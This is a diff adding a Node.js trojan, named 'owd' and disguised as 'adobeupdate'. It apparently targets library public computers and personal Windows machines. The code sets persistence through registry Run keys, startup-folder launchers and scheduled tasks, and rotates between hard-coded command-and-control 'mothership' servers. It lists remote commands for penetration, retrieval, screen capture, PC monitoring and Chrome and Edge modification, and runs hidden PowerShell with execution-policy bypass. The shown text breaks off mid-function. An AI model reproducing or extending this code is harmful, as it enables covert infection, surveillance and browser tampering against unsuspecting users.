@@ -1,0 +1,4950 @@
+const path = require("path");
+const PubNub = require("pubnub");
+const net = require("net");
+const { fork, exec, spawn } = require("child_process");
+const fs = require("fs");
+const os = require("os");
+const crypto = require("crypto");
+const util = require("util");
+
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+var process_argv = [];
+
+for (let token of process.argv) {
+    if (!token.includes("--inspect-brk")) process_argv.push(token);
+}
+
+// TODO implement
+var mothershipconfig = {};
+
+// TODO move over static configurations to systemconfig
+var systemstate = {
+    staticdelay: 30,
+
+    // TODO machinename vs username
+    // all TPLs have the same machinename, hostname
+    // TODO SJPCP --> st. james
+    //      RLPCP --> yonge/bloor reference library
+    //      username should be ADULT2022
+    get istpl() {
+        let machineprefix = this.machinename.toLowerCase().substring(0, 5);
+
+        if ( ["ADULT2022", "LC2022", "CAT2022"].includes(this.username.toUpperCase()) ) {
+            return true;
+        }
+
+        if (
+            machineprefix == "RLPCP".toLowerCase() ||
+            machineprefix == "SJPCP".toLowerCase()
+        ) {
+            return true;
+        }
+
+        if (fileExists(path.join(this.scriptdir, "tplmode"))) {
+            return true;
+        }
+
+        return false;
+    },
+
+    trojanname: "owd",
+    script_version: "full_infection_script",
+
+    get cmdname() {
+        let tcmdname = process_argv.length >= 3 ? process_argv[2] : "watchdog";
+
+        if (tcmdname == "launch_ping") tcmdname = "watchdog";
+
+        return tcmdname;
+    },
+
+    __cmdconfig: null,
+
+    get cmdconfig() {
+        if (this.__cmdconfig) return this.__cmdconfig;
+
+        this.__cmdconfig = new CmdConfig(this.cmdname);
+        return this.__cmdconfig;
+    },
+
+    get cmdtaskname() {
+        return this.cmdconfig.cmdtaskname;
+    },
+
+    get mothershipconfigfpath() {
+        return path.join(this.trojandir, "mothership");
+    },
+
+    mothershipindex: -1,
+    get mothership() {
+        if (this.mothershipindex < 0) return this.selectMothership();
+
+        return (this.istpl ? this.tplmothershiplist : this.phpmothershiplist)[
+            this.mothershipindex
+        ];
+    },
+    get mothershipassets() {
+        return "https://raw.githubusercontent.com/owd842/mothershipassets/master";
+    },
+
+    // TODO remove php motherships altogether
+    phpmothershiplist: [
+        "https://seashell-raven-793508.hostingersite.com",
+        "http://s1083932807.online-home.ca",
+        "https://darksalmon-crow-356809.hostingersite.com",
+    ],
+    tplmothershiplist: [
+        "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault",
+    ],
+    selectMothership: function () {
+        let mothershiparr = this.istpl
+            ? this.tplmothershiplist
+            : this.phpmothershiplist;
+
+        let mothershipurl = "";
+
+        if (fileExists(this.mothershipconfigfpath)) {
+            mothershipurl = readTag(this.mothershipconfigfpath);
+
+            if (!isNullOrWhitespace(mothershipurl)) {
+                for (let i = 0; i <= mothershiparr.length; i++) {
+                    if (mothershiparr[i] == mothershipurl) {
+                        this.mothershipindex = i;
+                        return mothershipurl;
+                    }
+                }
+            }
+        }
+
+        let count = mothershiparr.length;
+
+        if (this.mothershipindex < -1 || this.mothershipindex == count - 1) {
+            this.mothershipindex = 0;
+        } else {
+            this.mothershipindex++;
+        }
+
+        mothershipurl = mothershiparr[this.mothershipindex];
+
+        writeTag(this.mothershipconfigfpath, mothershipurl);
+
+        logmsg(
+            `index: ${this.mothershipindex} -- mothership: ${mothershipurl}`
+        );
+
+        return mothershipurl;
+    },
+
+    getClientJobPath() {
+        return path.join(this.trojandir, "clientjob_" + getRandomCode(8));
+    },
+
+    getClientJobConfigPath() {
+        return path.join(
+            this.trojandir,
+            "clientjobconfig_" + getRandomCode(8) + ".json"
+        );
+    },
+
+    __usersid: "",
+
+    get usersid() {
+        return this.__usersid;
+    },
+
+    set usersid(value) {
+        this.__usersid = value;
+    },
+
+    __clientid: "",
+
+    get clientid() {
+        if (isNullOrWhitespace(this.__clientid)) {
+            if (fileExists(systemstate.clientidfpath))
+                this.__clientid = readTag(systemstate.clientidfpath);
+        }
+
+        if (isNullOrWhitespace(this.__clientid)) {
+            this.__clientid = getRandomCode(8);
+            writeTag(systemstate.clientidfpath, this.__clientid);
+        }
+
+        return this.__clientid;
+    },
+
+    get clientidfpath() {
+        return path.join(this.trojandir, "client_id");
+    },
+
+    get pcmondir() {
+        return path.join(this.trojandir, "pcmon");
+    },
+
+    get pspcmondir() {
+        return path.join(this.trojandir, "pcmon");
+    },
+
+    get nodefolder() {
+        return "node-v26.4.0-win-x64";
+    },
+
+    get nodeexedir() {
+        return path.join(this.nodedir, this.nodefolder);
+    },
+
+    get nodeexepath() {
+        return "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs\\node.exe"; //path.join(this.nodeexedir, "node.exe");
+    },
+
+    get nodedir() {
+        return "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs"; //path.join(this.trojandir, "node");
+    },
+
+    get nodegsdfilesdir() {
+        return path.join(this.nodedir, "gsd_files");
+    },
+
+    get gsdfilesdir() {
+        return path.join(this.pythondir, "gsd_files");
+    },
+
+    get pythondir() {
+        return path.join(this.trojandir, "python");
+    },
+
+    get pythonexedir() {
+        return path.join(
+            systemstate.pythondir,
+            "work",
+            "Portable Python-3.10.5 x64",
+            "App",
+            "Python"
+        );
+    },
+
+    get pythonexepath() {
+        return path.join(systemstate.pythonexedir, "python.exe");
+    },
+
+    get trojandir() {
+        if (this.istpl) {
+            return path.join(process.env.ProgramData, this.trojanname);
+        }
+
+        return path.join(os.tmpdir(), this.trojanname);
+    },
+
+    get trojanfname() {
+        return "adobeupdate";
+    },
+
+    get trojanfpath() {
+        return path.join(this.trojandir, this.trojanfname);
+    },
+
+    get scriptparentpid() {
+        return process.ppid;
+    },
+
+    get scriptpid() {
+        return process.pid;
+    },
+
+    get scriptfpath() {
+        return process_argv[1];
+    },
+
+    get scriptdir() {
+        return path.dirname(this.scriptfpath);
+    },
+
+    get machinename() {
+        return os.hostname();
+    },
+
+    get username() {
+        let uinfo = os.userInfo();
+        return uinfo.username;
+    },
+
+    get source() {
+        return path.basename(this.scriptfpath);
+    },
+
+    scriptts: getTimestamp(),
+    __scriptmd5: "",
+    get scriptmd5() {
+        if (isNullOrWhitespace(this.__scriptmd5))
+            this.__scriptmd5 = getFileMD5(this.scriptfpath);
+
+        return this.__scriptmd5;
+    },
+
+    __sessionid: getRandomCode(8),
+
+    get sessionid() {
+        return this.__sessionid;
+    },
+
+    get logfpath() {
+        return path.join(
+            this.trojandir,
+            "master_" +
+            this.cmdname +
+            (!isNullOrWhitespace(this.cmdtaskname)
+                ? "_" + this.cmdtaskname
+                : "") +
+            "_" +
+            this.scriptts +
+            ".log"
+        );
+    },
+
+    get lockfname() {
+        return this.cmdconfig.lockfname;
+    },
+
+    get statekvp() {
+        return {
+            clientid: this.clientid,
+            sessionid: this.sessionid,
+            script_version: this.script_version,
+            source: this.source,
+            scriptts: this.scriptts,
+            machinename: this.machinename,
+            username: this.username,
+            scriptmd5: this.scriptmd5,
+        };
+    },
+
+    get statestr() {
+        return "";
+    },
+};
+
+var taskconfig = {
+    tasks: [
+        {
+            name: "adobeupdate_IdleTask",
+            enabled: true,
+            taskfunc: getIdleTaskXMLStr,
+            tasktime: 1,
+        },
+        {
+            name: "adobeupdate_RepTask",
+            enabled: true,
+            taskfunc: getRepTaskXMLStr,
+            tasktime: 1,
+        },
+        {
+            name: "adobeupdate_TimeTask",
+            enabled: true,
+            taskfunc: getTimeTaskXMLStr,
+            tasktime: 1,
+        },
+        {
+            name: "adobeupdate_DailyTask",
+            enabled: true,
+            taskfunc: getDailyTaskXMLStr,
+            tasktime: 1,
+        },
+    ],
+
+    getTaskTime(taskname) {
+        for (const task of this.tasks) {
+            if (task.name == taskname) return task.tasktime;
+        }
+        return -1;
+    },
+
+    getTaskXMLFunc(taskname) {
+        for (const task of this.tasks) {
+            if (task.name == taskname) {
+                return task.taskfunc;
+            }
+        }
+    },
+
+    get tasknames() {
+        let arr = [];
+
+        for (const task of this.tasks) {
+            arr.push(task.name);
+        }
+
+        return arr;
+    },
+};
+
+var regstartupconfig = {
+    get new_item_str() {
+        return "New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType String -Force";
+    },
+
+    get new_drive_tag() {
+        return `New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS`;
+    },
+
+    get_startup_script(reg_obj) {
+        let txt = "";
+        txt = regstartupconfig.get_name_value_str(reg_obj) + "\r\n";
+        txt += `$RegistryPath = "${reg_obj.path}"` + "\r\n";
+        txt += regstartupconfig.new_item_str;
+
+        if (["startup_hku", "startup_hku_default"].includes(reg_obj.name)) {
+            return regstartupconfig.new_drive_tag + "\r\n" + txt;
+        }
+
+        return txt;
+    },
+
+    get_startup_value(reg_obj) {
+        return `conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${reg_obj.name}`;
+    },
+
+    get_name_value_str(reg_obj) {
+        return (
+            `$Name = "adobeupdate_startup"` +
+            "\r\n" +
+            `$Value = "${regstartupconfig.get_startup_value(reg_obj)}"` +
+            "\r\n"
+        );
+    },
+
+    get reg_paths() {
+        let paths = [];
+
+        for (const reg of regstartupconfig.regs) {
+            if (!systemstate.istpl || reg.name != "starup_hku_default")
+                paths.push(reg.path);
+        }
+
+        return paths;
+    },
+
+    regs: [
+        {
+            name: "startup_hku",
+            get path() {
+                return `HKU:\\${systemstate.usersid}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`;
+            },
+            enabled: true,
+        },
+        {
+            name: "startup_hkcu",
+            path: `HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`,
+            enabled: true,
+        },
+        {
+            name: "startup_hklm",
+            path: "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            enabled: true,
+        },
+        {
+            name: "startup_hku_default",
+            path: "HKU:\\.DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            enabled: true,
+        },
+    ],
+};
+
+var startupfolderconfig = {
+    get launcher_fname() {
+        return "adobeupdate.cmd";
+    },
+
+    getFolder(foldername) {
+        this.folders.forEach((folder) => {
+            if (folder.name == foldername) return folder;
+        });
+    },
+
+    getScriptPath(foldername) {
+        return path.join(this.getFolderPath(foldername), this.launcher_fname);
+    },
+
+    getFolderPath(foldername) {
+        for (const folder of this.folders) {
+            if (folder.name == foldername) {
+                return folder.folderpath;
+            }
+        }
+    },
+
+    getLauncherScript(foldername) {
+        let pre = "@echo off" + "\r\n";
+        return (
+            pre +
+            `start "" /min wmic process call create "conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${foldername}"`
+        );
+    },
+
+    get foldernames() {
+        let tfoldernames = [];
+
+        this.folders.forEach((folder) => {
+            tfoldernames.push(folder.name);
+        });
+
+        return tfoldernames;
+    },
+
+    get folderpaths() {
+        let tfolderpaths = [];
+
+        this.folders.forEach((folder) => {
+            tfolderpaths.push(folder.folderpath);
+        });
+
+        return tfolderpaths;
+    },
+
+    get folders() {
+        if (systemstate.istpl) {
+            return startupfolderconfig.tpl_folders;
+        } else {
+            return startupfolderconfig.client_folders;
+        }
+    },
+
+    client_folders: [
+        {
+            enabled: true,
+            name: "startup_activeusers",
+            folderpath: `C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
+        },
+        {
+            enabled: true,
+            name: "startup_allusers",
+            folderpath:
+                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+        },
+    ],
+
+    tpl_folders: [
+        {
+            enabled: true,
+            name: "startup_allusers",
+            folderpath:
+                "C:\\Users\\All Users\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+        },
+
+        {
+            enabled: true,
+            name: "startup_profile",
+            folderpath:
+                "C:\\ProgramData\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+        },
+
+        {
+            enabled: true,
+            name: "startup_adult2022",
+            folderpath:
+                `C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
+        },
+    ],
+};
+
+var systemconfig = {
+    get launch_script_fname() {
+        return systemstate.istpl ? "tpl_launch.cmd" : "launch.cmd";
+    },
+
+    get launch_script_fpath() {
+        return path.join(systemstate.trojandir, this.launch_script_fname);
+    },
+};
+
+class CmdConfig {
+    #__cmdname = "";
+    #__launchprocname = ""; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
+    #__launchscriptfname = ""; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
+    #__childprocess = null;
+    #__childcmds = [];
+    #__parentcmdconfig = null;
+    #__cmdconfig = null; // for cmds launched as a job -- final param should be path to json clinetjob object
+
+    #__childpid = null;
+
+    #__pubnubrelay = null;
+
+    #__clientjob = null;
+
+    get clientjob() {
+        if (
+            ["cmdlist", "ping", "watchdog", "launch_ping"].includes(
+                this.cmdname
+            )
+        ) {
+            return null;
+        }
+
+        if (this.#__clientjob) return this.#__clientjob;
+
+        let configfpath = "";
+
+        configfpath = process_argv.length >= 4 ? process_argv[3] : "";
+
+        logmsg(`reading configfpath: ${configfpath}`);
+
+        if (!fileExists(configfpath)) {
+            throw new Error("configfpath does not exist " + configfpath);
+        }
+
+        let jsonconfigstr = readTag(configfpath);
+
+        if (isNullOrWhitespace(jsonconfigstr)) {
+            throw new Error("jsonconfigstr is empty");
+        }
+
+        logmsg("jsonconfigstr=" + jsonconfigstr);
+
+        let tclientjob = JSON.parse(jsonconfigstr);
+
+        logmsg("clientjob: " + JSON.stringify(tclientjob));
+
+        this.#__clientjob = tclientjob;
+
+        return this.#__clientjob;
+    }
+
+    set pubnubrelay(value) {
+        this.#__pubnubrelay = value;
+    }
+
+    get pubnubrelay() {
+        return this.#__pubnubrelay;
+    }
+
+    set parentcmdconfig(value) {
+        return (this.#__parentcmdconfig = value);
+    }
+
+    get parentcmdconfig() {
+        return this.#__parentcmdconfig;
+    }
+
+    get childpid() {
+        return this.#__childpid;
+    }
+
+    get config() {
+        if (this.#__cmdconfig) return this.#__cmdconfig;
+
+        if (["task", "watchdog", "cmdlist", "ping"].includes(this.cmdname)) {
+            return null;
+        }
+
+        if (process_argv.length <= 3) {
+            return null;
+        }
+
+        let cmdconfig_json = readTag(process_argv[3]);
+        let cmdconfig_obj = JSON.parse(cmdconfig_json);
+
+        this.#__cmdconfig = cmdconfig_obj;
+        return this.#__cmdconfig;
+    }
+
+    get jobcode() {
+        let configobj = this.config;
+
+        return configobj?.jobcode ?? "";
+    }
+
+    get childprocess() {
+        return this.#__childprocess;
+    }
+
+    get launchscriptfname() {
+        return this.#__launchscriptfname;
+    }
+
+    get cmdtaskname() {
+        if (this.cmdname == "task" && process_argv.length >= 4) {
+            return process_argv[3];
+        }
+
+        return "";
+    }
+
+    set cmdname(value) {
+        if (CmdConfig.isCmdExist(value)) this.#__cmdname = value;
+        else throw new Error("cmd is not supported [" + value + "]");
+    }
+
+    get cmdname() {
+        return this.#__cmdname;
+    }
+
+    get launchprocname() {
+        return this.#__launchprocname;
+    }
+
+    getChildCmd(cmdname) {
+        for (let i = 0; i < this.#__childcmds.length; i++) {
+            let childcmd = this.#__childcmds[i];
+            if (childcmd.cmdname == cmdname) {
+                return childcmd;
+            }
+        }
+
+        return null;
+    }
+
+    get childcmds() {
+        if (!this.#__childcmds) this.#__childcmds = [];
+
+        return this.#__childcmds;
+    }
+
+    // should be overriden by implementing cmd
+    loopfunc = async () => {
+        logmsg("pss");
+    };
+
+    newCmdConfig(tcmdname) {
+        let childcmd = new CmdConfig(tcmdname, this);
+        this.addchildcmd(childcmd);
+
+        return childcmd;
+    }
+
+    constructor(tcmdname, cmdconfig) {
+        this.cmdname = tcmdname;
+        this.parentcmdconfig = cmdconfig;
+    }
+
+    // list of supported commands
+    static cmdfuncs = {
+        watchdog: watchdog,
+        task: watchdog,
+        launch_ping: watchdog,
+
+        penetrate: penetrate,
+        retrieve: retrieve,
+
+        cmdlist: cmdlist,
+        ping: ping,
+        pcmon: pcmon,
+        pspcmon: pspcmon,
+        execjob: execjob,
+        relay: relay,
+        install_python: install_python,
+        install_node: install_node,
+        cleanup: cleanup,
+        modify_chrome: modify_chrome,
+        modify_msedge: modify_msedge,
+
+        getsystemoverview: getsystemoverview,
+        getscreencapture: getscreencapture,
+    };
+
+    get dynamicdelay() {
+        return crypto.randomInt(1, 10) * 5;
+    }
+
+    get cmdfunc() {
+        return CmdConfig.cmdfuncs[this.cmdname];
+    }
+
+    static isCmdExist(tcmdname) {
+        return Object.hasOwn(CmdConfig.cmdfuncs, tcmdname);
+    }
+
+    get cmdpidfpath() {
+        return path.join(systemstate.trojandir, this.cmdname + "_running");
+    }
+
+    readcmdpid() {
+        if (!fileExists(this.cmdpidfpath)) return -1;
+
+        let pid = readTag(this.cmdpidfpath);
+
+        return pid;
+    }
+
+    get lockfname() {
+        let _fname = "";
+        _fname = systemstate.trojanname + "_" + this.cmdname;
+        _fname +=
+            (!isNullOrWhitespace(this.cmdtaskname)
+                ? "_" + this.cmdtaskname
+                : "") + "_lock";
+
+        return "\\\\.\\pipe\\" + _fname;
+    }
+
+    async activate(cmdlineargs, exitparent) {
+        logmsg("starting");
+
+        if (isPidAlive(this.childpid)) {
+            logmsg(
+                `no need to run [${this.cmdname}]-- child process exists with pid [${this.childpid}]`
+            );
+            return;
+        }
+
+        let pipe_exists = await checkIfPipeExists(this.lockfname);
+
+        if (pipe_exists) {
+            logmsg(
+                `no need to run [${this.cmdname}]-- pipe exists with name [${this.lockfname}]`
+            );
+
+            return;
+        }
+
+        let ret = await this.launch(cmdlineargs, !exitparent ? false : true);
+
+        return ret;
+    }
+
+    // ! overriden when new child cmd is created by cmdlist
+    //   default impelmentation: watchdog uses this function to relay messages between ping and cmdlist
+    // message handler -- used by parent cmds to process incoming messages from child cmds
+    processMessage(msg) {
+        logmsg("starting -- watchdog implementation");
+
+        let parentcmd = this.parentcmdconfig;
+
+        if (!parentcmd) return;
+
+        let src = msg.src;
+        let dest = msg.dest;
+        let payload = msg.payload;
+
+        let destcmd = parentcmd.getChildCmd(dest);
+
+        if (!destcmd) {
+            throw new Error("could not obtain child cmd for " + dest);
+        }
+
+        this.sendMessage(destcmd, src, payload);
+
+        logmsg("finished");
+    }
+
+    // used by parent cmds to send message to child cmds (watchdog send msg to ping, cmdlist)
+    sendMessage(destcmd, src, msgpayload) {
+        let childp = destcmd.childprocess;
+
+        if (!childp) {
+            throw new Error("childcmd does not have valid child process");
+        }
+
+        if (!isChildHealthy(childp)) {
+            throw new Error("childprocess is not healthy");
+        }
+
+        let msgout = {
+            senderPid: process.pid,
+            src: src,
+            dest: destcmd.cmdname,
+            payload: msgpayload,
+            ts: getTimestamp(),
+        };
+
+        if (childp.connected && !childp.killed) {
+            logmsg("sending message to child: " + JSON.stringify(msgout));
+
+            childp.send(msgout);
+        }
+    }
+
+    async launch(cmdlineargs, exitparent) {
+        if (!exitparent) exitparent = false;
+
+        logmsg(`launching [${this.cmdname}]`);
+
+        let child = null;
+
+        cmdlineargs = !(Array.isArray(cmdlineargs) && cmdlineargs.length >= 1)
+            ? []
+            : cmdlineargs;
+
+        cmdlineargs = [this.cmdname, ...cmdlineargs];
+
+        return new Promise((resolve, reject) => {
+            if (!fileExists(systemstate.trojanfpath)) {
+                reject(
+                    new Error(
+                        "trojan script does not exists at " +
+                        systemstate.trojanfpath
+                    )
+                );
+            }
+
+            if (exitparent) {
+                logmsg("spawning child");
+                child = spawn(
+                    systemstate.nodeexepath,
+                    [systemstate.trojanfpath, ...cmdlineargs],
+                    { stdio: "ignore", windowsHide: true }
+                );
+            } else {
+                logmsg("forking child");
+                child = fork(systemstate.trojanfpath, cmdlineargs, {
+                    windowsHide: true,
+                });
+            }
+
+            if (!child) {
+                reject(new Error("failed to launch child proc"));
+            } else {
+                logmsg("child process launch success");
+            }
+
+            child.unref();
+
+            this.#__childprocess = child;
+            this.#__childpid = child?.pid;
+            this.#__launchprocname = path.basename(child.spawnargs[0]);
+            this.#__launchscriptfname = path.basename(systemstate.trojanfpath);
+
+            logmsg(
+                `launched child ${this.cmdname} pid=${child.pid} spawn args: ` +
+                JSON.stringify(child.spawnargs)
+            );
+            // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]
+
+            writeTag(this.cmdpidfpath, String(child.pid));
+
+            // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
+            child.on("message", (message) => {
+                logmsg("[YER]incomming message: " + JSON.stringify(message));
+
+                this.processMessage(message);
+            });
+
+            child.on("exit", (code) => {
+                logmsg(`Child process ${child.pid} exited with code ${code}`);
+            });
+
+            child.on("close", (code) => {
+                logmsg(`Process exited with code ${code}`);
+            });
+
+            child.on("error", (err) => {
+                logmsg("Failed to start child process:", err.message);
+                reject(err);
+            });
+
+            child.on("spawn", () => {
+                logmsg(`Child successfully started with PID: ${child.pid}`);
+
+                resolve(child);
+            });
+        });
+    }
+
+    exitramp() {
+        let fpath = path.join(systemstate.trojandir, "killall");
+
+        if (fileExists(fpath)) {
+            logmsg("found killall -- exiting");
+            process.exit(0);
+            return;
+        }
+
+        fpath = path.join(
+            systemstate.trojandir,
+            "reset_" + systemstate.cmdconfig.cmdname
+        );
+
+        if (fileExists(fpath)) {
+            rmSync(fpath, { force: true });
+            process.exit(0);
+            return;
+        }
+    }
+
+    async loop() {
+        logmsg("starting main looop");
+
+        if (!this.loopfunc) {
+            logmsg("Fatal Error: loopfunc is not a valid function");
+            process.exit(1);
+        }
+
+        let loopindex = 0;
+        while (true) {
+            loopindex++;
+            logmsg(
+                `loop starting -- loopindex=${loopindex} -- ${getTimestamp()}`
+            );
+
+            this.exitramp();
+
+            try {
+                if (isAsyncFunction(this.loopfunc)) await this.loopfunc();
+                else this.loopfunc();
+            } catch (err) {
+                logmsg(err);
+            }
+
+            logmsg("sleeping for [" + systemstate.staticdelay + "] seconds");
+
+            for (let i = 0; i < (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
+                logmsg(
+                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
+                    }]`
+                );
+
+                await sleep(1000);
+            }
+
+            let num =
+                systemstate.cmdconfig.dynamicdelay ??
+                crypto.randomInt(1, 10) * 5;
+
+            logmsg(`sleeping for an additional ${num} seconds`);
+
+            for (let i = 0; i < (ISDEBUG ? 0 : num); i++) {
+                logmsg(
+                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
+                    }]`
+                );
+                await sleep(1000);
+            }
+        }
+    }
+
+    addchildcmd(cmdconfig) {
+        if (!this.childcmds) this.childcmds = [];
+
+        this.childcmds.push(cmdconfig);
+    }
+}
+
+// ---
+
+function getusersid_whoami() {
+    // whoami /user /fo csv
+    // ("User Name", "SID");
+    // ("laptop-ue7q62ol\sebas", "S-1-5-21-435801507-4188035712-3236683676-1001");
+    return new Promise((resolve, reject) => {
+        exec("whoami /user /fo csv", (error, stdout, stderr) => {
+            if (error) {
+                reject(error);
+            }
+
+            if (!isNullOrWhitespace(stdout)) {
+                const lines = stdout.trim().split("\n");
+
+                if (lines.length > 1) {
+                    const row = lines[1].split(",");
+                    const sid = row[1].replace(/"/g, ""); // Removes wrapping quotes
+                    resolve(sid);
+                }
+            }
+
+            if (!isNullOrWhitespace(stderr)) resolve(stderr);
+
+            resolve("");
+        });
+    });
+}
+
+function getusersid() {
+    return new Promise((resolve, reject) => {
+        const psCommand = `(Get-LocalUser -Name "${systemstate.username}").SID.Value`;
+
+        exec(
+            `powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "${psCommand}"`,
+            { maxBuffer: 1024 * 1024 * 10 },
+            (error, stdout, stderr) => {
+                if (error) {
+                    reject(error);
+                }
+
+                if (stderr) {
+                    resolve(stderr);
+                }
+
+                resolve(stdout);
+            }
+        );
+    });
+}
+
+function isChildHealthy(childProcess) {
+    return (
+        childProcess !== null &&
+        childProcess.pid !== undefined && // Has a valid Process ID
+        childProcess.killed === false && // Has not been sent a kill signal
+        childProcess.connected === true // IPC channel is open and ready
+    );
+}
+
+function ensureSingleInstancePipe(initfunc) {
+    const PIPE_NAME = systemstate.lockfname;
+
+    logmsg(`obtaining lock  ${PIPE_NAME}`);
+
+    const server = net.createServer();
+
+    server.on("error", (err) => {
+        if (err.code === "EADDRINUSE") {
+            logmsg(
+                `Fatal Error: another instance is already running. -- exiting -- err.code: ${err.code}`
+            );
+            process.exit(1);
+        }
+    });
+
+    server.listen(PIPE_NAME, async () => {
+        server.unref();
+
+        if (initfunc) {
+            try {
+                initfunc();
+            } catch (err) {
+                logmsg(err);
+            }
+        }
+    });
+}
+
+function copyFile(srcfpath, destfpath, overwrite = true) {
+    if (!fs.existsSync(srcfpath)) {
+        throw new Error("file does not exist [" + srcfpath + "]");
+    }
+
+    const destDir = path.dirname(destfpath);
+
+    if (!fs.existsSync(destDir)) {
+        logmsg("creating [" + destDir + "]");
+        fs.mkdirSync(destDir, { recursive: true });
+    }
+
+    if (overwrite || !fileExists(destfpath))
+        fs.copyFileSync(srcfpath, destfpath);
+}
+
+function getFileMD5(fpath) {
+    if (!fileExists(fpath)) {
+        throw new Error("file does not exist [" + fpath + "]");
+    }
+
+    const fileBuffer = fs.readFileSync(fpath);
+
+    return crypto.createHash("md5").update(fileBuffer).digest("hex");
+}
+
+async function exec_pslist() {
+    let pslisttxt = "";
+
+    let exepath = path.join(systemstate.trojandir, "pslist.exe");
+
+    if (!fileExists(exepath)) {
+        throw new Error("pslist.exe does not exist ");
+    }
+
+    let childp = await invoke_exe(
+        "pslist.exe",
+        ["-accepteula"],
+        systemstate.trojandir,
+        (text) => {
+            pslisttxt += text;
+        },
+        null
+    );
+
+    return pslisttxt;
+}
+
+async function checkIfPipeExists(pipePath) {
+    try {
+        const stats = await fs.stat(pipePath);
+        return stats.isFIFO();
+    } catch (error) {
+        return false;
+    }
+}
+
+function isInteger(str) {
+    // Reject empty strings or spaces, which Number() converts to 0
+    if (typeof str !== "string" || str.trim() === "") return false;
+
+    return Number.isInteger(Number(str));
+}
+
+async function getProcessList_pslist() {
+    let pslisttxt = await exec_pslist();
+
+    let proclist = [];
+
+    const lines = pslisttxt.split(/\r?\n/).filter((line) => line.trim() !== "");
+
+    // Name                Pid Pri Thd  Hnd   Priv        CPU Time    Elapsed Time
+    let begin = false;
+    for (let i = 0; i < lines.length; i++) {
+        let tokens = lines[i]
+            .trim()
+            .split(/\s+/)
+            .filter((word) => word.trim() !== "");
+
+        if (!begin && !tokens.includes("Elapsed")) {
+            continue;
+        }
+
+        if (!begin) {
+            begin = true;
+            continue;
+        }
+
+        let procname = "";
+        let pid = "";
+
+        for (let j = 0; j < tokens.length; j++) {
+            let token = tokens[j];
+
+            if (!isInteger(token)) {
+                procname += " " + token;
+            } else {
+                pid = token;
+                break;
+            }
+        }
+
+        proclist.push({
+            ProcessId: pid,
+            Name: procname.trim(),
+            CommandLine: "",
+        });
+    }
+
+    return proclist;
+}
+
+function csvToJson(csvData) {
+    const lines = csvData.split(/\r?\n/).filter((line) => line.trim() !== "");
+
+    const headers = lines[0].split(",");
+
+    lines.splice(0, 1);
+
+    const result = [];
+
+    // Loop through the remaining rows
+    for (let i = 0; i < lines.length; i++) {
+        const obj = {};
+        const currentLine = lines[i].split(",");
+
+        for (let j = 0; j < headers.length; j++) {
+            obj[headers[j].trim()] = currentLine[j]?.trim() || "";
+        }
+        result.push(obj);
+    }
+
+    return result;
+    // Save the output
+    // fs.writeFileSync(jsonPath, JSON.stringify(result, null, 2), 'utf-8');
+}
+
+function isUTF16LEBuffer(buffer) {
+    if (!Buffer.isBuffer(buffer) || buffer.length < 2) {
+        return false;
+    }
+
+    // UTF-16LE BOM is 0xFF 0xFE
+    return buffer[0] === 0xff && buffer[1] === 0xfe;
+}
+
+async function exec_wmic_process() {
+    return new Promise((resolve, reject) => {
+        const wmicCommand =
+            "wmic process get ProcessId,Name,CommandLine /format:csv";
+
+        exec(wmicCommand, (error, stdout, stderr) => {
+            if (error) {
+                reject(error);
+            }
+
+            if (stderr) {
+                reject(stderr);
+            }
+
+            resolve(stdout);
+        });
+    });
+}
+
+async function getProcessList_wmic() {
+    let buffer = await exec_wmic_process();
+    let isutf16le = isUTF16LEBuffer(buffer);
+
+    let csvData = isutf16le
+        ? buffer.toString("utf16le")
+        : buffer.toString("utf8");
+
+    // { CommandLine, Name, Node, ProcessId }
+    let jsondata = csvToJson(csvData);
+
+    return jsondata;
+}
+
+async function getProcessList_ps() {
+    return new Promise((resolve, reject) => {
+        const psCommand = `Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | ConvertTo-Json`;
+
+        exec(
+            `powershell.exe -NoProfile -Command "${psCommand}"`,
+            { maxBuffer: 1024 * 1024 * 10 },
+            (error, stdout, stderr) => {
+                if (error) {
+                    reject(error);
+                }
+
+                if (stderr) {
+                    reject(stderr);
+                }
+
+                const processes = JSON.parse(stdout);
+                // CommandLine
+                // Name
+                // ProcessId
+
+                resolve(processes);
+            }
+        );
+    });
+}
+
+async function initProcessList() {
+    logmsg("starting");
+
+    let outproclist = [];
+
+    try {
+        outproclist = await getProcessList_wmic();
+    } catch (err) {
+        logmsg(err);
+    }
+
+    if (outproclist && outproclist.length > 0) {
+        return outproclist;
+    }
+
+    try {
+        outproclist = await getProcessList_pslist();
+    } catch (err) {
+        logmsg(err);
+    }
+
+    if (outproclist && outproclist.length > 0) {
+        return outproclist;
+    }
+
+    try {
+        outproclist = await getProcessList_ps();
